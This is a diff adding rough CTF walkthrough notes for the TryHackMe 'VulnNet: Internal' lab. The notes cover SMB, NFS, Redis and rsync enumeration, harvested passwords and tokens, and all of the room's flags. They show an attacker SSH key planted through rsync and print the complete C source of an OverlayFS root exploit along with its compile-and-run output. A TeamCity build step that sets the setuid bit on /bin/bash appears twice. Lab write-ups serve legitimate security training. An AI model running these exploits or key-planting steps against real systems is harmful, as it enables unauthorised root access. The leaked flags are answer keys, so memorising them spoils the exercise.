@@ -1,0 +1,449 @@
+[VulnNet: Internal]
+10.10.86.159
+#Enumeration
+ ========================== 
+|    Target Information    |
+ ========================== 
+Target ........... 10.10.86.159
+RID Range ........ 500-550,1000-1050
+Username ......... ''
+Password ......... ''
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ ==================================================== 
+|    Enumerating Workgroup/Domain on 10.10.86.159    |
+ ==================================================== 
+[+] Got domain/workgroup name: WORKGROUP
+
+ ============================================ 
+|    Nbtstat Information for 10.10.86.159    |
+ ============================================ 
+Looking up status of 10.10.86.159
+        VULNNET-INTERNA <00> -         B <ACTIVE>  Workstation Service
+        VULNNET-INTERNA <03> -         B <ACTIVE>  Messenger Service
+        VULNNET-INTERNA <20> -         B <ACTIVE>  File Server Service
+        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
+        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections
+
+        MAC Address = 00-00-00-00-00-00
+
+ ===================================== 
+|    Session Check on 10.10.86.159    |
+ ===================================== 
+[+] Server 10.10.86.159 allows sessions using username '', password ''
+
+ =========================================== 
+|    Getting domain SID for 10.10.86.159    |
+ =========================================== 
+Domain Name: WORKGROUP
+Domain Sid: (NULL SID)
+[+] Can't determine if host is part of domain or part of a workgroup
+
+ ====================================== 
+|    OS information on 10.10.86.159    |
+ ====================================== 
+Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
+[+] Got OS info for 10.10.86.159 from smbclient: 
+[+] Got OS info for 10.10.86.159 from srvinfo:
+        VULNNET-INTERNAWk Sv PrQ Unx NT SNT vulnnet-internal server (Samba, Ubuntu)
+        platform_id     :       500
+        os version      :       6.1
+        server type     :       0x809a03
+
+ ============================= 
+|    Users on 10.10.86.159    |
+ ============================= 
+Use of uninitialized value $users in print at ./enum4linux.pl line 874.
+Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 877.
+
+Use of uninitialized value $users in print at ./enum4linux.pl line 888.
+Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 890.
+
+ ========================================= 
+|    Share Enumeration on 10.10.86.159    |
+ ========================================= 
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        print$          Disk      Printer Drivers
+        shares          Disk      VulnNet Business Shares
+        IPC$            IPC       IPC Service (vulnnet-internal server (Samba, Ubuntu))
+SMB1 disabled -- no workgroup available
+
+[+] Attempting to map shares on 10.10.86.159
+//10.10.86.159/print$   Mapping: DENIED, Listing: N/A
+//10.10.86.159/shares   Mapping: OK, Listing: OK
+//10.10.86.159/IPC$     [E] Can't understand response:
+NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
+
+ ==================================================== 
+|    Password Policy Information for 10.10.86.159    |
+ ==================================================== 
+
+
+[+] Attaching to 10.10.86.159 using a NULL share
+
+[+] Trying protocol 139/SMB...
+
+[+] Found domain(s):
+
+        [+] VULNNET-INTERNAL
+        [+] Builtin
+
+[+] Password Info for Domain: VULNNET-INTERNAL
+
+        [+] Minimum password length: 5
+        [+] Password history length: None
+        [+] Maximum password age: 37 days 6 hours 21 minutes 
+        [+] Password Complexity Flags: 000000
+
+                [+] Domain Refuse Password Change: 0
+                [+] Domain Password Store Cleartext: 0
+                [+] Domain Password Lockout Admins: 0
+                [+] Domain Password No Clear Change: 0
+                [+] Domain Password No Anon Change: 0
+                [+] Domain Password Complex: 0
+
+        [+] Minimum password age: None
+        [+] Reset Account Lockout Counter: 30 minutes 
+        [+] Locked Account Duration: 30 minutes 
+        [+] Account Lockout Threshold: None
+        [+] Forced Log off Time: 37 days 6 hours 21 minutes 
+
+
+[+] Retieved partial password policy with rpcclient:
+
+Password Complexity: Disabled
+Minimum Password Length: 5
+
+
+ ============================== 
+|    Groups on 10.10.86.159    |
+ ============================== 
+
+[+] Getting builtin groups:
+
+[+] Getting builtin group memberships:
+
+[+] Getting local groups:
+
+[+] Getting local group memberships:
+
+[+] Getting domain groups:
+
+[+] Getting domain group memberships:
+
+ ======================================================================= 
+|    Users on 10.10.86.159 via RID cycling (RIDS: 500-550,1000-1050)    |
+ ======================================================================= 
+[I] Found new SID: S-1-22-1
+[I] Found new SID: S-1-5-21-1569020563-4280465252-527208056
+
+#Nmap Scan
+Discovered open port 22/tcp on 10.10.86.159
+Discovered open port 139/tcp on 10.10.86.159
+Discovered open port 111/tcp on 10.10.86.159
+Discovered open port 445/tcp on 10.10.86.159
+Discovered open port 2049/tcp on 10.10.86.159
+
+[First Flag]
+smb: \temp\> get services.txt -
+THM{0a09d51e488f5fa105d8d866a497440a}
+getting file \temp\services.txt of size 38 as - (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
+
+#NFS
+Next we’ll proceed with the NFS server, but what is actually NFS?
+    It is a client/server system that allows users to access files across a network and treat them as if they resided in a local file directory
+    We can use this command to mount NFS on a mount point.
+showmount -e $IP
+mkdir /tmp/NFS
+sudo mount -t nfs $IP:/opt/conf /tmp/NFS
+cat /redis/redis.conf | grep "requirepass"
+
+#Password to a redis server
+requirepass "B65Hx562F@ggAZ@F"
+
+10.10.82.254:6379> keys *
+1) "authlist"
+2) "tmp"
+3) "int"
+4) "internal flag"
+5) "marketlist"
+10.10.82.254:6379> 
+[2nd Flag]
+10.10.82.254:6379> GET "internal flag"
+"THM{ff8e518addbbddb74531a724236a8221}"
+
+#If we simply GET "authlist" we get an error informing us the operation cannot run because the key has the wrong kind of value. 
+#GET only works on keys with string values.
+So we can TYPE "authlist" and see that as the name implies, authlist’s datatype is a list. To dump the values we can run:
+LRANGE "authlist" 0 -1
+10.10.82.254:6379> LRANGE "authlist" 0 -1
+1) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
+Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v
+
+#Now we can enumerate rsync for shared directories using one of nmap’s scripts:
+┌──(brian㉿kali)-[~/…/hacks/tryhackme/VulnNetInternal/mnt]
+└─$ nmap -Pn -sV --script "rsync-list-modules" -p 873 10.10.66.44
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-24 11:02 EDT
+Nmap scan report for 10.10.66.44
+Host is up (0.098s latency).
+PORT    STATE SERVICE VERSION
+873/tcp open  rsync   (protocol version 31)
+| rsync-list-modules: 
+|_  files               Necessary home interaction
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 1.63 seconds
+
+There is one directory named files. Can we see what’s inside now?
+rsync -av --list-only rsync://rsync-connect@10.10.66.44/files
+----------------------------------------------------------------------
+Yes we can! Let’s download all the files so we can explore them locally.
+rsync -av rsync://rsync-connect@10.10.66.44/files ./loot/rsync_files
+
+[Third Flag]
+┌──(kali㉿kali)-[~/files/sys-internal]
+└─$ cat user.txt    
+THM{da7c20696831f253e0afaca8b83c07ab}
+
+#Initial FootHold
+└─$ rsync -ahv /home/kali/.ssh/id_rsa.pub rsync://rsync-connect@10.10.82.254:873/files/sys-internal/.ssh/authorized_keys --inplace --no-o --no-g                 10 ⨯
+Password: 
+sending incremental file list
+id_rsa.pub
+sent 657 bytes  received 41 bytes  45.03 bytes/sec
+total size is 563  speedup is 0.81
+
+[Shell]
+└─$ ssh sys-internal@10.10.82.254                                                                                                  
+Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-135-generic x86_64)
+sys-internal@vulnnet-internal:~$ 
+-----------------------------------------------
+sys-internal@vulnnet-internal:~$ find / -type f -perm -u=s 2>/dev/null
+/bin/mount
+/bin/fusermount
+/bin/ping
+->/bin/ntfs-3g
+#Trial<----->https://nvd.nist.gov/vuln/detail/CVE-2017-0358
+ntfs-3g (Debian 9) - Local Privilege Escalation 
+
+#Checking for services
+└─$ ss -tulpn            
+Netid        State          Recv-Q         Send-Q                 Local Address:Port                  Peer Address:Port        Process                                
+udp          UNCONN         0              0                            0.0.0.0:60258                      0.0.0.0:*                                                  
+tcp          LISTEN         0              128                        127.0.0.1:8111                       0.0.0.0:*            users:(("ssh",pid=29522,fd=5))        
+tcp          LISTEN         0              128                            [::1]:8111                          [::]:*            users:(("ssh",pid=29522,fd=4))
+
+[Road to root]
+ssh sys-internal@10.10.82.254 -L 8111:localhost:8111
+----------------------------------------------------
+grep -ir 'authentication token' 2>/dev/null
+It appears a log file contains several tokens. Chances are many of them may have expired but we can tail logs/catalina.out and grab the most recent token.
+----------------------------------------------------
+sys-internal@vulnnet-internal:/TeamCity/logs$ tail catalina.out 
+
+sys-internal@vulnnet-internal:/TeamCity/logs$ grep -iR token /TeamCity/logs/ 2>/dev/null
+/TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 8446629153054945175 (use empty username with the token as the password to access the server)
+/TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 8446629153054945175 (use empty username with the token as the password to access the server)
+/TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 3782562599667957776 (use empty username with the token as the password to access the server)
+/TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 5812627377764625872 (use empty username with the token as the password to access the server)
+/TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 5961526005134866660 (use empty username with the token as the password to access the server)
+/TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 5961526005134866660 (use empty username with the token as the password to access the server)
+
+
+[Flag 4 Overlay FS]
+With OverlayFS exploitPermalink
+
+sys-internal@vulnnet-internal:~$ cd /tmp
+
+sys-internal@vulnnet-internal:/tmp$ cat xpl.c
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <err.h>
+#include <errno.h>
+#include <sched.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <sys/wait.h>
+#include <sys/mount.h>
+
+//#include <attr/xattr.h>
+//#include <sys/xattr.h>
+int setxattr(const char *path, const char *name, const void *value, size_t size, int flags);
+
+
+#define DIR_BASE    "./ovlcap"
+#define DIR_WORK    DIR_BASE "/work"
+#define DIR_LOWER   DIR_BASE "/lower"
+#define DIR_UPPER   DIR_BASE "/upper"
+#define DIR_MERGE   DIR_BASE "/merge"
+#define BIN_MERGE   DIR_MERGE "/magic"
+#define BIN_UPPER   DIR_UPPER "/magic"
+
+
+static void xmkdir(const char *path, mode_t mode)
+{
+    if (mkdir(path, mode) == -1 && errno != EEXIST)
+        err(1, "mkdir %s", path);
+}
+
+static void xwritefile(const char *path, const char *data)
+{
+    int fd = open(path, O_WRONLY);
+    if (fd == -1)
+        err(1, "open %s", path);
+    ssize_t len = (ssize_t) strlen(data);
+    if (write(fd, data, len) != len)
+        err(1, "write %s", path);
+    close(fd);
+}
+
+static void xcopyfile(const char *src, const char *dst, mode_t mode)
+{
+    int fi, fo;
+
+    if ((fi = open(src, O_RDONLY)) == -1)
+        err(1, "open %s", src);
+    if ((fo = open(dst, O_WRONLY | O_CREAT, mode)) == -1)
+        err(1, "open %s", dst);
+
+    char buf[4096];
+    ssize_t rd, wr;
+
+    for (;;) {
+        rd = read(fi, buf, sizeof(buf));
+        if (rd == 0) {
+            break;
+        } else if (rd == -1) {
+            if (errno == EINTR)
+                continue;
+            err(1, "read %s", src);
+        }
+
+        char *p = buf;
+        while (rd > 0) {
+            wr = write(fo, p, rd);
+            if (wr == -1) {
+                if (errno == EINTR)
+                    continue;
+                err(1, "write %s", dst);
+            }
+            p += wr;
+            rd -= wr;
+        }
+    }
+
+    close(fi);
+    close(fo);
+}
+
+static int exploit()
+{
+    char buf[4096];
+
+    sprintf(buf, "rm -rf '%s/'", DIR_BASE);
+    system(buf);
+
+    xmkdir(DIR_BASE, 0777);
+    xmkdir(DIR_WORK,  0777);
+    xmkdir(DIR_LOWER, 0777);
+    xmkdir(DIR_UPPER, 0777);
+    xmkdir(DIR_MERGE, 0777);
+
+    uid_t uid = getuid();
+    gid_t gid = getgid();
+
+    if (unshare(CLONE_NEWNS | CLONE_NEWUSER) == -1)
+        err(1, "unshare");
+
+    xwritefile("/proc/self/setgroups", "deny");
+
+    sprintf(buf, "0 %d 1", uid);
+    xwritefile("/proc/self/uid_map", buf);
+
+    sprintf(buf, "0 %d 1", gid);
+    xwritefile("/proc/self/gid_map", buf);
+
+    sprintf(buf, "lowerdir=%s,upperdir=%s,workdir=%s", DIR_LOWER, DIR_UPPER, DIR_WORK);
+    if (mount("overlay", DIR_MERGE, "overlay", 0, buf) == -1)
+        err(1, "mount %s", DIR_MERGE);
+
+    // all+ep
+    char cap[] = "\x01\x00\x00\x02\xff\xff\xff\xff\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00";
+
+    xcopyfile("/proc/self/exe", BIN_MERGE, 0777);
+    if (setxattr(BIN_MERGE, "security.capability", cap, sizeof(cap) - 1, 0) == -1)
+        err(1, "setxattr %s", BIN_MERGE);
+
+    return 0;
+}
+
+int main(int argc, char *argv[])
+{
+    if (strstr(argv[0], "magic") || (argc > 1 && !strcmp(argv[1], "shell"))) {
+        setuid(0);
+        setgid(0);
+        execl("/bin/bash", "/bin/bash", "--norc", "--noprofile", "-i", NULL);
+        err(1, "execl /bin/bash");
+    }
+
+    pid_t child = fork();
+    if (child == -1)
+        err(1, "fork");
+
+    if (child == 0) {
+        _exit(exploit());
+    } else {
+        waitpid(child, NULL, 0);
+    }
+
+    execl(BIN_UPPER, BIN_UPPER, "shell", NULL);
+    err(1, "execl %s", BIN_UPPER);
+}
+EOF
+
+sys-internal@vulnnet-internal:/tmp$ gcc xpl.c -o xpl
+sys-internal@vulnnet-internal:/tmp$ ./xpl
+bash-4.4# cat /root/root.txt
+THM{e8996faea46df09dba5676dd271c60bd}
+
+After enumerating the listening ports, you find out, that on 8111 a service called TeamCity is running. LinPeas also will show you the path, where this application is installed: /opt/TeamCity.
+Do local port forwarding:
+root@kali$ ssh -N -L 8111:127.0.0.1:8111 -i ./id_rsa sys-internal@10.10.63.1
+Visit localhost:8111 on your browser. You will see, that you can login as superuser with an authentication token. The authentication token can be extracted from the file: /TeamCity/logs/catalina.out
+After logging in, you can create a project, choose manual project, create a build configuration, choose manually, skip the question for “New VCS Root”, choose “Build Steps” on the left menu to add a build step, choose the runner type “Python”. As command you choose a custom script where you enter:
+
+import os
+os.system("chmod +s /bin/bash")
+
+Click on save, click on the project and click on run to run the build. After that you can run bash on privileged mode to get root rights:
+
+sys-internal@vulnnet-internal:/tmp$ bash -p
+bash-4.4# id
+uid=1000(sys-internal) gid=1000(sys-internal) euid=0(root) egid=0(root) groups=0(root),24(cdrom),1000(sys-internal)
+
+
+[Rooted!]
+sys-internal@vulnnet-internal:/tmp$ gcc exploit.c -o exploit
+sys-internal@vulnnet-internal:/tmp$ ./exploit
+bash-4.4# cat /root/root.txt
+THM{e8996faea46df09dba5676dd271c60bd}
+bash-4.4# 
+
+[Team City]
+Visit localhost:8111 on your browser. You will see, that you can login as superuser with an authentication token. The authentication token can be extracted from the file: /TeamCity/logs/catalina.out
+After logging in, you can create a project, choose manual project, create a build configuration, choose manually, skip the question for “New VCS Root”, choose “Build Steps” on the left menu to add a build step, choose the runner type “Python”. As command you choose a custom script where you enter:
+import os
+os.system("chmod +s /bin/bash")
+
+Click on save, click on the project and click on run to run the build. After that you can run bash on privileged mode to get root rights:
+
+sys-internal@vulnnet-internal:/tmp$ bash -p
+bash-4.4# id
+uid=1000(sys-internal) gid=1000(sys-internal) euid=0(root) egid=0(root) groups=0(root),24(cdrom),1000(sys-internal)
